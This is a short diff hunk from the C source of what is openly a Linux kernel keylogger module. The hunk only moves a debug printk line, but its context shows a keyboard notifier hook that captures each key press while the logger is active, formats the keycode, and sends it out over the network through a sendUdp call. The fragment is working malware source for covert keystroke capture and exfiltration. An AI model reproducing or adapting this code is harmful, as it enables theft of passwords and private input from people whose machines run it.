@@ -73,8 +73,8 @@ int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_para
 #endif
 
 	if (code == KBD_KEYCODE && param->down && KEYLOGGER_ACTIVE){
-	      printk(KERN_DEBUG "KEYLOGGER SENDING KEY %i %s\n", param->value, (param->down ? "down" : "up"));
 	      char str[5];
+        printk(KERN_DEBUG "KEYLOGGER SENDING KEY %i %s\n", param->value, (param->down ? "down" : "up"));
 	      sprintf(str, "%d.", param->value);
 	      sendUdp(str);
     }
